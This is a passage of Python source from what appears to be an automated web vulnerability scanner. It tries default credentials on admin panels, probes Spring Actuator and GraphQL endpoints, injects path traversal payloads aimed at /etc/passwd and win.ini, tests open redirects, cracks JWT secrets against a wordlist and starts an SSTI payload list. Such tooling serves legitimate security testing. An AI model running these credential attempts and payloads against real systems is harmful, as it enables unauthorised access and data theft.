        "success_body":  ['"statusCode":200', "token"],
        "fail_body":     ["Unauthorized", "Invalid credentials"],
    },
    # Jupyter Notebook
    {
        "service":  "Jupyter",
        "paths":    ["/api/login"],
        "method":   "POST",
        "payloads": [
            {"password": ""},
            {"password": "jupyter"},
            {"password": "admin"},
        ],
        "detect_path":   "/login",
        "detect_body":   ["jupyter", "ipython"],
        "success_body":  ["notebook_list", "/tree"],
        "fail_body":     ["Invalid credentials"],
    },
    # Adminer
    {
        "service":  "Adminer",
        "paths":    ["/adminer.php", "/adminer/", "/adminer"],
        "method":   "POST",
        "payloads": [
            {"auth[server]": "localhost", "auth[username]": "root", "auth[password]": "", "auth[db]": ""},
            {"auth[server]": "localhost", "auth[username]": "admin", "auth[password]": "admin", "auth[db]": ""},
        ],
        "detect_path":   None,  # detection is path-based
        "detect_body":   ["adminer", "login - adminer"],
        "success_body":  ["adminer.org", ">Adminer<", "adminer-login", "select database", "Select database"],
        "fail_body":     ["Invalid credentials", "Access denied"],
    },
    # phpMyAdmin
    {
        "service":  "phpMyAdmin",
        "paths":    ["/phpmyadmin/index.php", "/pma/index.php", "/phpMyAdmin/index.php"],
        "method":   "POST",
        "payloads": [
            {"pma_username": "root",  "pma_password": ""},
            {"pma_username": "root",  "pma_password": "root"},
            {"pma_username": "admin", "pma_password": "admin"},
        ],
        "detect_path":   None,
        "detect_body":   ["phpmyadmin", "pma_navigation"],
        "success_body":  ["pma_table_grid", "phpmyadmin/server_databases"],
        "fail_body":     ["Cannot log in", "Access denied"],
    },
    # Traefik dashboard
    {
        "service":  "Traefik",
        "paths":    ["/dashboard/"],
        "method":   "GET",
        "payloads": [{}],
        "detect_path":   "/dashboard/",
        "detect_body":   ["traefik"],
        "success_body":  ["traefik", "@router"],
        "fail_body":     [],
    },
    # RabbitMQ Management
    {
        "service":  "RabbitMQ",
        "paths":    ["/api/whoami"],
        "method":   "GET_BASIC",
        "payloads": [
            {"username": "guest", "password": "guest"},
            {"username": "admin", "password": "admin"},
        ],
        "detect_path":   "/",
        "detect_body":   ["rabbitmq", "management plugin"],
        "success_body":  ['"name":"guest"', '"name":"admin"', '"tags"'],
        "fail_body":     ["Not authorized"],
    },
]

_defcred_checked = set()

def check_default_credentials(base_url, domain):
    """
    For each known admin panel, check if it's present at the base URL
    then attempt default credential pairs. Alerts CRITICAL on success.

    Two-phase:
      1. Detect: GET detect_path, check detect_body strings
      2. Attempt: POST/GET login endpoint with each credential pair
    """
    if domain in _defcred_checked:
        return
    _defcred_checked.add(domain)

    for panel in DEFAULT_CREDS:
        service = panel["service"]

        # ── Phase 1: Detect if service is present ──────────────
        detect_path = panel.get("detect_path")
        if detect_path:
            detect_url = base_url.rstrip("/") + detect_path
            dresp = safe_get(detect_url, timeout=5)
            if not dresp or dresp.status_code not in (200, 401, 403):
                continue
            body_lower = dresp.text.lower()
            if not any(sig.lower() in body_lower for sig in panel["detect_body"]):
                continue
            print(timestamp() + f" Detected {service} at {detect_url} — trying default creds...")
        else:
            # Path-based detection (Adminer, phpMyAdmin)
            detected = False
            for path in panel["paths"]:
                check_url = base_url.rstrip("/") + path
                dresp = safe_get(check_url, timeout=5)
                if dresp and dresp.status_code == 200:
                    if any(sig.lower() in dresp.text.lower() for sig in panel["detect_body"]):
                        detected = True
                        break
            if not detected:
                continue
            print(timestamp() + f" Detected {service} — trying default creds...")

        # ── Phase 2: Try credential pairs ──────────────────────
        method  = panel["method"]
        success = False

        for path in panel["paths"]:
            if success:
                break
            login_url = base_url.rstrip("/") + path

            for creds in panel["payloads"]:
                try:
                    stealth_delay(domain)
                    if method == "POST":
                        resp = requests.post(login_url, data=creds,
                                             headers=create_request_header(),
                                             timeout=6, allow_redirects=True)
                    elif method == "POST_JSON":
                        resp = requests.post(login_url, json=creds,
                                             headers={**create_request_header(),
                                                      "Content-Type": "application/json"},
                                             timeout=6, allow_redirects=True)
                    elif method == "GET_BASIC":
                        resp = requests.get(login_url,
                                            auth=(creds.get("username",""), creds.get("password","")),
                                            headers=create_request_header(),
                                            timeout=6)
                    else:  # GET
                        resp = requests.get(login_url, headers=create_request_header(), timeout=6)

                    body = resp.text.lower()

                    # Check for explicit failure strings first
                    fail_sigs = panel.get("fail_body", [])
                    if any(f.lower() in body for f in fail_sigs):
                        continue

                    # Check for fail redirect
                    fail_redir = panel.get("fail_redirect", "")
                    if fail_redir and fail_redir in resp.url:
                        continue

                    # Check for success — require body or header confirmation, never bare 200
                    success_sigs = panel.get("success_body", [])
                    success_hdrs = panel.get("success_headers", [])
                    header_match = any(
                        (h.split(":")[0] in resp.headers and
                         (len(h.split(":")) == 1 or h.split(":", 1)[1].lower() in resp.headers.get(h.split(":")[0], "").lower()))
                        for h in success_hdrs
                    )
                    if (success_sigs and any(s.lower() in body for s in success_sigs)) or header_match:
                        cred_str = str(creds)
                        alert(
                            f"DEFAULT CREDENTIALS ACCEPTED: {service}",
                            "CRITICAL",
                            login_url,
                            f"{service} login succeeded with credentials: {cred_str}"
                        )
                        print(timestamp() + f" [!!] DEFAULT CREDS WORK: {service} at {login_url} with {cred_str}")
                        success = True
                        break

                except Exception as e:
                    print_error(f"Default cred attempt failed for {service} at {login_url}: {e}")

        if not success and detect_path:
            print(timestamp() + f" {service}: no default creds accepted at {base_url}")


# ─────────────────────────────────────────────
# Spring Boot Actuator exposure detection
# ─────────────────────────────────────────────

# Actuator endpoints ordered by severity
# (path, severity, description)
ACTUATOR_ENDPOINTS = [
    ("/actuator/env",         "CRITICAL", "Exposes all environment variables and config — may contain passwords, API keys, DB credentials"),
    ("/actuator/heapdump",    "CRITICAL", "Full JVM heap dump download — contains in-memory secrets, session tokens, plaintext passwords"),
    ("/actuator/httptrace",   "HIGH",     "Full HTTP request/response history including auth headers and cookies"),
    ("/actuator/mappings",    "HIGH",     "Exposes all Spring MVC route mappings — full internal API surface"),
    ("/actuator/beans",       "HIGH",     "Lists all Spring beans and their dependencies — internal architecture exposure"),
    ("/actuator/configprops", "HIGH",     "All @ConfigurationProperties values including credentials"),
    ("/actuator/loggers",     "MEDIUM",   "Log level configuration — can be modified to enable debug logging"),
    ("/actuator/metrics",     "MEDIUM",   "Application performance metrics and internal counters"),
    ("/actuator/info",        "MEDIUM",   "App version, git commit hash, build info"),
    ("/actuator",             "MEDIUM",   "Actuator root — lists all enabled endpoints"),
    # Older Spring Boot 1.x paths
    ("/env",                  "CRITICAL", "Spring Boot 1.x env endpoint — exposes all environment variables"),
    ("/dump",                 "CRITICAL", "Spring Boot 1.x thread dump"),
    ("/trace",                "HIGH",     "Spring Boot 1.x HTTP trace"),
    ("/mappings",             "HIGH",     "Spring Boot 1.x route mappings"),
    ("/beans",                "HIGH",     "Spring Boot 1.x bean list"),
    ("/autoconfig",           "MEDIUM",   "Spring Boot 1.x autoconfiguration report"),
    ("/metrics",              "MEDIUM",   "Spring Boot 1.x metrics"),
]

# Body signatures that confirm a response is a real Actuator endpoint
ACTUATOR_BODY_SIGNATURES = [
    "activeProfiles", "propertySources", "applicationConfig",
    "systemEnvironment", "systemProperties", "managementConfigurationProperties",
    "contexts", "beans", "mappings", "dispatcherServlets",
]

_actuator_checked = set()

def check_actuator_exposure(base_url, domain):
    """
    Probe Spring Boot Actuator endpoints at the given base URL.
    Confirms findings by checking response body for Actuator-specific
    JSON keys before alerting — avoids false positives on generic 200s.

    CRITICAL for env/heapdump (direct credential exposure).
    HIGH for mappings/beans/httptrace (architecture/session exposure).
    MEDIUM for informational endpoints.
    """
    if domain in _actuator_checked:
        return
    _actuator_checked.add(domain)

    for path, severity, description in ACTUATOR_ENDPOINTS:
        url = base_url.rstrip("/") + path
        try:
            # allow_redirects=False — a 301/302 to the homepage means the
            # endpoint doesn't exist. CloudFront and nginx redirect unknown
            # paths rather than returning 404, causing false positives.
            stealth_delay(domain)
            resp = requests.get(url, headers=create_request_header(),
                                timeout=5, allow_redirects=False)
            if not resp or resp.status_code not in (200, 401, 403):
                continue

            # 401/403 means the endpoint exists but is auth-protected —
            # worth logging but not alerting as CRITICAL
            if resp.status_code in (401, 403):
                print(timestamp() + f" Actuator endpoint exists (protected): {url} [{resp.status_code}]")
                continue

            body_bytes = resp.content
            body       = resp.text
            ct         = resp.headers.get("Content-Type", "")

            # heapdump returns binary HPROF format.
            # Verify magic bytes: real dumps start with "JAVA PROFILE"
            # (e.g. "JAVA PROFILE 1.0.1\0" or "JAVA PROFILE 1.0.2\0")
            # A WAF/CDN challenge page or HTML error will never match this.
            if "heapdump" in path:
                hprof_magic = b"JAVA PROFILE"
                if body_bytes[:12] == hprof_magic:
                    alert(
                        "SPRING BOOT ACTUATOR EXPOSED",
                        severity,
                        url,
                        f"{description}. HPROF magic bytes confirmed. "
                        f"Response size: {len(body_bytes)} bytes"
                    )
                    print(timestamp() + f" [!!] Actuator heapdump exposed (HPROF confirmed): {url} ({len(body_bytes)} bytes)")
                else:
                    print(timestamp() + f" Heapdump probe returned 200 but HPROF magic not found — likely WAF/CDN interference: {url}")
                continue

            # For JSON endpoints, confirm with body signatures
            if "json" in ct or any(sig in body for sig in ACTUATOR_BODY_SIGNATURES):
                alert(
                    "SPRING BOOT ACTUATOR EXPOSED",
                    severity,
                    url,
                    description
                )
                print(timestamp() + f" [!!] Actuator endpoint exposed [{severity}]: {url}")

        except Exception as e:
            print_error(f"check_actuator_exposure failed for {url}: {e}")


# ─────────────────────────────────────────────
# GraphQL introspection detection
# ─────────────────────────────────────────────

GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/api/graphql", "/api/graphql/",
    "/v1/graphql", "/v2/graphql", "/query", "/gql",
    "/graphiql", "/playground",
]

GRAPHQL_INTROSPECTION_QUERY = '{"query":"{__schema{types{name fields{name}}}}"}'

GRAPHQL_INTROSPECTION_INDICATORS = [
    "__schema", "__typename", "queryType", "mutationType",
    "types", "directives",
]

_graphql_checked = set()

def check_graphql_introspection(base_url, domain):
    """
    Probe common GraphQL paths and test whether introspection is enabled.
    Introspection in production exposes the full API schema to unauthenticated
    attackers. Alerts HIGH when confirmed.
    """
    if domain in _graphql_checked:
        return
    _graphql_checked.add(domain)

    for path in GRAPHQL_PATHS:
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = requests.post(
                url,
                data=GRAPHQL_INTROSPECTION_QUERY,
                headers={**create_request_header(), "Content-Type": "application/json"},
                timeout=6,
                allow_redirects=False,
            )
            if resp.status_code not in (200, 201):
                continue
            body = resp.text
            ct   = resp.headers.get("Content-Type", "")
            if "json" not in ct and "__schema" not in body:
                continue
            matched = [ind for ind in GRAPHQL_INTROSPECTION_INDICATORS if ind in body]
            if len(matched) >= 2:
                type_count = body.count('"name"')
                alert(
                    "GRAPHQL INTROSPECTION ENABLED",
                    "HIGH",
                    url,
                    f"Full API schema exposed — {type_count} name fields visible. "
                    f"Indicators: {', '.join(matched[:4])}"
                )
                print(timestamp() + f" [!!] GraphQL introspection enabled: {url}")
                return
        except Exception as e:
            print_error(f"check_graphql_introspection failed for {url}: {e}")


# ─────────────────────────────────────────────
# SSRF candidate parameter flagging
# ─────────────────────────────────────────────

# Parameter names that commonly accept URLs or remote resources.
# Presence of these on an auth-gated or server-side endpoint is an SSRF risk.
SSRF_PARAM_NAMES = {
    "url", "uri", "redirect", "callback", "return", "returnurl", "return_url",
    "returnto", "return_to", "next", "target", "dest", "destination",
    "go", "goto", "link", "src", "source", "ref", "referrer", "image",
    "img", "proxy", "fetch", "load", "remote", "endpoint", "service",
    "webhook", "notify", "ping", "host", "site", "feed", "data",
    "path", "file", "open", "domain", "port", "to", "from",
}

_ssrf_flagged = set()   # domains already flagged (one alert per domain)

def flag_ssrf_candidates(page_url, html_content):
    """
    Scan page links and form inputs for URL-accepting parameter names.
    These are common SSRF entry points — flags them as MEDIUM candidates
    for manual follow-up testing. Does not make any requests.
    """
    domain = urlparse(page_url).netloc
    if domain in _ssrf_flagged:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    found = set()

    # Query params from all hrefs/actions on the page
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            try:
                parsed = urlparse(href)
                for pair in (parsed.query or "").split("&"):
                    if "=" in pair:
                        k, _ = pair.split("=", 1)
                        if k.lower() in SSRF_PARAM_NAMES:
                            found.add(k.lower())
            except Exception:
                pass

    # Also check the current page URL's own params
    try:
        parsed = urlparse(page_url)
        for pair in (parsed.query or "").split("&"):
            if "=" in pair:
                k, _ = pair.split("=", 1)
                if k.lower() in SSRF_PARAM_NAMES:
                    found.add(k.lower())
    except Exception:
        pass

    # Form input names
    for inp in soup.find_all("input"):
        name = (inp.get("name") or "").lower()
        if name in SSRF_PARAM_NAMES:
            found.add(name)

    if found:
        _ssrf_flagged.add(domain)
        param_list = ", ".join(sorted(found))
        alert(
            "SSRF CANDIDATE PARAMETERS DETECTED",
            "MEDIUM",
            page_url,
            f"URL-accepting parameters found — manually test for SSRF: {param_list}"
        )
        print(timestamp() + f" SSRF candidates on {domain}: {param_list}")


# ─────────────────────────────────────────────
# Open redirect detection
# ─────────────────────────────────────────────

REDIRECT_PARAMS = {
    "next", "url", "redirect", "redirect_url", "redirect_uri",
    "return", "return_to", "returnTo", "returnUrl", "return_url",
    "goto", "go", "dest", "destination", "target", "redir",
    "continue", "forward", "location", "ref", "referer",
    "callback", "callback_url", "jump", "link", "out", "r",
    "to", "uri", "path",
}

REDIRECT_CANARY  = "https://example.com/nuscrape-redirect-test"
_redirect_tested  = set()
_redirect_domains = set()

def _redirect_to_canary(location):
    """
    Return True only when the Location header points to the canary domain.
    Uses proper URL parsing to avoid false positives like example.com.attacker.com.
    """
    if not location:
        return False
    try:
        loc = location.strip()
        # Handle protocol-relative URLs (//example.com/...)
        if loc.startswith("//"):
            loc = "https:" + loc
        parsed = urlparse(loc)
        netloc = parsed.netloc.lower()
        # Strip port if present
        netloc = netloc.split(":")[0]
        # Strip leading www.
        if netloc.startswith("www."):
            netloc = netloc[4:]
        canary = "example.com"
        return netloc == canary or netloc.endswith("." + canary)
    except Exception:
        return False


def check_open_redirects(page_url, html_content):
    """
    Parse links on the page for URL parameters that accept redirect
    destinations. Inject an external canary and check if the response
    redirects there. Alerts HIGH on confirmed open redirect.
    """
    domain = urlparse(page_url).netloc
    if domain in _redirect_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    candidate_urls = set()
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            candidate_urls.add(href)
    candidate_urls.add(page_url)

    redirect_params_lower = {p.lower() for p in REDIRECT_PARAMS}

    for candidate in candidate_urls:
        if domain in _redirect_domains:
            break
        try:
            parsed = urlparse(candidate)
            if not parsed.query:
                continue
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param, value in params.items():
            if param.lower() not in redirect_params_lower:
                continue

            test_key = (parsed.scheme + "://" + parsed.netloc + parsed.path, param)
            if test_key in _redirect_tested:
                continue
            _redirect_tested.add(test_key)

            new_query = "&".join(
                f"{k}={REDIRECT_CANARY}" if k == param else f"{k}={v}"
                for k, v in params.items()
            )
            test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + new_query

            try:
                stealth_delay(domain)
                resp = requests.get(
                    test_url,
                    headers=create_request_header(),
                    timeout=5,
                    allow_redirects=False,
                )
                location = resp.headers.get("Location", "")
                if _is_akamai_block(resp):
                    continue
                if resp.status_code in (301, 302, 303, 307, 308) and \
                   _redirect_to_canary(location):
                    _redirect_domains.add(domain)
                    alert(
                        "OPEN REDIRECT",
                        "HIGH",
                        test_url,
                        f"Parameter '{param}' redirects to injected URL. "
                        f"Location: {location[:120]}"
                    )
                    print(timestamp() + f" [!!] Open redirect: {test_url} → {location[:80]}")
                    break
            except Exception as e:
                print_error(f"Open redirect test failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# Path traversal detection
# ─────────────────────────────────────────────

# Parameter names that commonly accept file paths or template names
PATH_TRAVERSAL_PARAMS = {
    "file", "path", "template", "page", "include", "load", "read",
    "document", "doc", "filename", "filepath", "name", "src", "source",
    "view", "content", "resource", "fetch", "url", "data", "input",
    "dir", "folder", "location", "route", "nav", "show", "display",
    "layout", "module", "conf", "config", "cfg", "setting",
}

# Traversal payloads — ordered from shallow to deep
# Each tuple: (payload, os_hint)
# os_hint: 'unix', 'windows', or 'both'
PATH_TRAVERSAL_PAYLOADS = [
    # Unix — /etc/passwd
    ("../../../etc/passwd",              "unix"),
    ("../../../../etc/passwd",           "unix"),
    ("../../../../../etc/passwd",        "unix"),
    ("../../../../../../etc/passwd",     "unix"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "unix"),   # URL-encoded
    ("..%2f..%2f..%2fetc%2fpasswd",      "unix"),           # partial encode
    ("....//....//....//etc/passwd",     "unix"),           # double-dot bypass
    # Unix — /etc/hosts (less sensitive but confirms traversal)
    ("../../../etc/hosts",               "unix"),
    ("../../../../etc/hosts",            "unix"),
    # Windows — win.ini
    ("..\\..\\..\\windows\\win.ini",     "windows"),
    ("../../../../windows/win.ini",      "windows"),
    ("%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "windows"),
    # Windows — system32/drivers/etc/hosts
    ("../../../../windows/system32/drivers/etc/hosts", "windows"),
]

# Signatures that confirm successful file read
PATH_TRAVERSAL_UNIX_SIGS = [
    "root:x:0:0",       # /etc/passwd
    "root:*:0:0",       # BSD /etc/passwd
    "daemon:x:",
    "/bin/bash",
    "/bin/sh",
    "127.0.0.1\tlocalhost",   # /etc/hosts
    "::1\tlocalhost",
]

PATH_TRAVERSAL_WIN_SIGS = [
    "[fonts]",          # win.ini
    "[extensions]",     # win.ini
    "[mci extensions]",
    "for 16-bit app support",
    "127.0.0.1",        # hosts file
]

_traversal_tested  = set()   # (base_url, param) already tested
_traversal_domains = set()   # domains already confirmed vulnerable

def check_path_traversal(page_url, html_content):
    """
    Parse links on the page for parameters that may accept file paths.
    For each unique (endpoint, param) pair, inject traversal sequences
    and check the response body for known file content signatures.

    Two-phase:
      1. Collect candidate parameters from page links
      2. For each untested (endpoint, param), try payloads until confirmed
         or exhausted

    Alerts CRITICAL on confirmed traversal with file content evidence.
    Deduplicates per domain — stops testing once one confirmed finding
    per domain is recorded (avoid hammering the server).
    """
    domain = urlparse(page_url).netloc
    if domain in _traversal_domains:
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="replace")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Collect candidate URLs from page links + current page URL
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href and href.startswith("http"):
            all_urls.append(href)

    traversal_params_lower = {p.lower() for p in PATH_TRAVERSAL_PARAMS}

    for raw_url in all_urls:
        if domain in _traversal_domains:
            break
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            params = {}
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        except Exception:
            continue

        for param in params:
            if param.lower() not in traversal_params_lower:
                continue
            if domain in _traversal_domains:
                break

            base_endpoint = parsed.scheme + "://" + parsed.netloc + parsed.path
            test_key = (base_endpoint, param)
            if test_key in _traversal_tested:
                continue
            _traversal_tested.add(test_key)

            print(timestamp() + f" Path traversal probe: {base_endpoint} param={param}")

            for payload, os_hint in PATH_TRAVERSAL_PAYLOADS:
                if domain in _traversal_domains:
                    break
                try:
                    # Build test URL with traversal payload
                    new_query = "&".join(
                        f"{k}={payload}" if k == param else f"{k}={v}"
                        for k, v in params.items()
                    )
                    test_url = base_endpoint + "?" + new_query

                    stealth_delay(domain)
                    resp = requests.get(
                        test_url,
                        headers=create_request_header(),
                        timeout=6,
                        allow_redirects=True,
                    )

                    if resp.status_code not in (200, 206):
                        continue

                    body = resp.text

                    # Check Unix signatures
                    unix_hit = [s for s in PATH_TRAVERSAL_UNIX_SIGS if s in body]
                    if unix_hit:
                        _traversal_domains.add(domain)
                        alert(
                            "PATH TRAVERSAL — FILE READ CONFIRMED",
                            "CRITICAL",
                            test_url,
                            f"Parameter '{param}' reads arbitrary files. "
                            f"Payload: {payload!r} — response contains: {unix_hit[0]!r}"
                        )
                        print(timestamp() + f" [!!] Path traversal confirmed: {test_url} "
                              f"param={param} payload={payload!r}")
                        break

                    # Check Windows signatures
                    win_hit = [s for s in PATH_TRAVERSAL_WIN_SIGS
                               if s.lower() in body.lower()]
                    if win_hit:
                        _traversal_domains.add(domain)
                        alert(
                            "PATH TRAVERSAL — FILE READ CONFIRMED",
                            "CRITICAL",
                            test_url,
                            f"Parameter '{param}' reads arbitrary files (Windows). "
                            f"Payload: {payload!r} — response contains: {win_hit[0]!r}"
                        )
                        print(timestamp() + f" [!!] Path traversal confirmed (Windows): "
                              f"{test_url} param={param} payload={payload!r}")
                        break

                except Exception as e:
                    print_error(f"Path traversal probe failed for {test_url}: {e}")


# ─────────────────────────────────────────────
# JWT detection and weakness analysis
# ─────────────────────────────────────────────

import base64 as _b64

# Regex to find JWT tokens anywhere — cookies, headers, HTML, JS
JWT_REGEX = re.compile(
    r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{0,}'
)

# Weak secrets commonly used in development that get shipped to prod.
# Covers common patterns: generic words, framework defaults, env var patterns,
# company/app name placeholders, and common keyboard walks.
JWT_WEAK_SECRETS = [
    # Generic words
    "secret", "password", "123456", "test", "dev", "development",
    "production", "change_me", "changeme", "your-secret", "your_secret",
    "jwt_secret", "jwtsecret", "supersecret", "super_secret",
    "mysecret", "my_secret", "app_secret", "appsecret",
    "secret_key", "secretkey", "private_key", "privatekey",
    "default", "example", "sample", "demo", "admin",
    # Framework / library defaults
    "django-insecure-", "flask-secret", "laravel_secret", "rails_secret",
    "express-session-secret", "cookie-secret", "session-secret",
    "your-256-bit-secret", "your-512-bit-secret",
    "HS256", "HS384", "HS512",
    # Common placeholder patterns
    "changethis", "change-this", "replace-me", "replaceme", "todo",
    "fixme", "pleasechangeme", "please_change_me", "updatethis",
    "insert_secret_here", "put_secret_here", "put-your-secret-here",
    "CHANGE_ME", "REPLACE_ME", "YOUR_SECRET_HERE",
    # Short / trivial
    "1", "12", "123", "1234", "12345", "123456789", "1234567890",
    "pass", "passwd", "password1", "password123", "passw0rd",
    "qwerty", "qwerty123", "letmein", "welcome", "login",
    "abc", "abc123", "abcdef", "abcdefgh",
    # Common app/env patterns
    "app", "app_key", "appkey", "application", "application_secret",
    "api", "api_key", "apikey", "api_secret", "apisecret",
    "auth", "auth_secret", "auth_key", "authkey", "auth_token",
    "token", "token_secret", "access_token", "refresh_token",
    "key", "mykey", "my_key", "private", "public",
    "prod", "production_secret", "prod_secret",
    "staging", "staging_secret",
    "local", "localhost",
    # Node / Express
    "keyboard cat", "keyboard_cat", "express", "express-secret",
    "session", "sessions", "cookie", "cookies",
    # Python / Django / Flask
    "django", "flask", "python", "pythonsecret",
    "SECRET_KEY", "secret_key_goes_here",
    # Java / Spring
    "spring", "spring-boot", "java", "springboot",
    "mySecretKey", "jwtSecretKey",
    # PHP / Laravel
    "laravel", "php", "symfony", "silex",
    # Ruby / Rails
    "rails", "ruby", "sinatra",
    # Go
    "golang", "go-secret",
    # Database
    "mysql", "postgres", "mongodb", "redis",
    # Common names / keyboard walks
    "admin123", "administrator", "root", "toor", "master",
    "iloveyou", "sunshine", "monkey", "dragon", "baseball",
    "qwerty", "azerty", "zxcvbn", "1q2w3e4r", "q1w2e3r4",
    "asdfgh", "asdfghjkl", "zxcvbnm",
    # Docker / CI / infra defaults
    "docker", "kubernetes", "k8s", "jenkins", "gitlab",
    "travis", "circleci", "github",
    # Numbers
    "111111", "222222", "333333", "999999", "000000",
    "11111111", "99999999", "00000000",
    # JWT-specific common leaks seen in public GitHub repos
    "your_jwt_secret", "jwt-secret-key", "jwt_key", "jwtkey",
    "jwt-signing-secret", "signing-secret", "sign_secret",
    "hmac-secret", "hmac_secret", "token_key", "token-key",
    "bearer", "bearer_secret",
    # Company/product placeholder names
    "myapp", "my-app", "mywebsite", "my-website", "myservice",
    "acme", "acmecorp", "example.com", "test.com",
    # Length-1 to common short secrets
    "s", "ss", "sss", "key", "keys",
    "x", "xx", "xxx", "secret1", "Secret1", "Secret123",
]

# jwt.io demo token — shown on the jwt.io homepage and in tutorials everywhere
_JWT_DEMO_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
    ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)
_JWT_DEMO_SIG = _JWT_DEMO_TOKEN.split(".")[-1]

# Cracked secrets that are known documentation placeholders — not real leaks
_JWT_PLACEHOLDER_SECRETS = {
    "your-256-bit-secret", "your-512-bit-secret", "secret", "your-secret",
}

_jwt_seen    = set()   # deduplicate by token signature (last segment)
_jwt_domains = set()   # domains already reported

def _b64_decode_segment(segment):
    """Base64url-decode a JWT segment, padding as needed."""
    padding = 4 - len(segment) % 4
    if padding != 4:
        segment += "=" * padding
    try:
        return _b64.urlsafe_b64decode(segment).decode("utf-8", errors="replace")
    except Exception:
        return ""

def _hmac_sign(secret, header_b64, payload_b64):
    """Return base64url-encoded HMAC-SHA256 signature."""
    import hmac as _hmac
    import hashlib as _hashlib
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = _hmac.new(secret.encode(), msg, _hashlib.sha256).digest()
    return _b64.urlsafe_b64encode(sig).rstrip(b"=").decode()

def analyse_jwt(token, source_url):
    """
    Decode and analyse a JWT for security weaknesses:
      1. alg: none — signature entirely bypassed
      2. Weak HS256 secret — brute-force against common passwords
      3. Expired token still in use — server may not validate exp
      4. Sensitive data in payload — PII/credentials in cleartext

    Alerts CRITICAL for alg:none and confirmed weak secrets.
    Alerts HIGH for sensitive payload data.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return

    # Suppress the jwt.io demo token — it appears in tutorials and examples everywhere
    sig = parts[2]
    if sig == _JWT_DEMO_SIG:
        return

    # Deduplicate by signature segment
    if sig in _jwt_seen:
        return
    _jwt_seen.add(sig)

    header_raw  = _b64_decode_segment(parts[0])
    payload_raw = _b64_decode_segment(parts[1])

    try:
        header  = json.loads(header_raw)
        payload = json.loads(payload_raw)
    except Exception:
        return  # malformed — skip

    alg = str(header.get("alg", "")).lower()

    # ── 1. alg: none ──────────────────────────────────────────
    if alg == "none":
        alert(
            "JWT ALG:NONE — SIGNATURE BYPASS",
            "CRITICAL",
            source_url,
            f"JWT uses alg:none — signature not verified. "
            f"Subject: {payload.get('sub', payload.get('user', '?'))}",
            redact_detail=False
        )
        print(timestamp() + f" [!!] JWT alg:none at {source_url}")
        return

    # ── 2. Weak HS256 secret ───────────────────────────────────
    if alg == "hs256":
        for secret in JWT_WEAK_SECRETS:
            expected = _hmac_sign(secret, parts[0], parts[1])
            if expected == parts[2]:
                # Suppress known documentation placeholders — not real findings
                if secret.lower() in _JWT_PLACEHOLDER_SECRETS:
                    break
                alert(
                    "JWT WEAK SECRET",
                    "CRITICAL",
                    source_url,
                    f"JWT HS256 secret cracked: '{secret}'. "
                    f"Full token forgery possible. "
                    f"Subject: {payload.get('sub', '?')}",
                    redact_detail=False
                )
                print(timestamp() + f" [!!] JWT weak secret '{secret}' at {source_url}")
                return

    # ── 3. Expired token ──────────────────────────────────────
    exp = payload.get("exp")
    if exp:
        try:
            import time as _time
            if _time.time() > float(exp):
                print(timestamp() + f" JWT expired token still present: {source_url}")
                write_to_js_database(source_url, source_url, "jwt_expired",
                                     f"exp={exp} sub={payload.get('sub','?')}")
        except Exception:
            pass

    # ── 4. Sensitive data in payload ─────────────────────────
    sensitive_keys = {"password", "passwd", "secret", "token", "key",
                      "ssn", "credit_card", "card_number", "cvv"}
    found_sensitive = [k for k in payload if k.lower() in sensitive_keys]
    if found_sensitive:
        domain = urlparse(source_url).netloc
        if domain not in _jwt_domains:
            _jwt_domains.add(domain)
            alert(
                "JWT SENSITIVE PAYLOAD DATA",
                "HIGH",
                source_url,
                f"JWT payload contains sensitive fields: {found_sensitive}. "
                f"JWT payloads are base64-encoded, NOT encrypted."
            )

    print(timestamp() + f" JWT analysed: alg={alg} sub={payload.get('sub','?')} iss={payload.get('iss','?')} at {source_url}")

def scan_for_jwts(source_url, content, response_headers=None):
    """
    Scan page HTML, JS content, and response headers/cookies for JWTs
    and analyse each unique one found.
    """
    text = content if isinstance(content, str) \
           else content.decode("utf-8", errors="replace") if content else ""

    # Scan body content
    for token in JWT_REGEX.findall(text):
        analyse_jwt(token, source_url)

    # Scan Set-Cookie and Authorization headers
    if response_headers:
        for header_name in ("Set-Cookie", "set-cookie", "Authorization", "authorization"):
            val = response_headers.get(header_name, "")
            if val:
                for token in JWT_REGEX.findall(val):
                    analyse_jwt(token, source_url)


# ─────────────────────────────────────────────
# Server-Side Template Injection (SSTI) detection
# ─────────────────────────────────────────────

# SSTI payload templates — {A} and {B} are replaced with random large integers
# per test run so the expected product can't appear coincidentally on the page.
# Each tuple: (payload_template, engine_hint)
SSTI_PAYLOAD_TEMPLATES = [
    ("{{{{A}}*{{B}}}}",   "Jinja2/Twig/Pebble"),
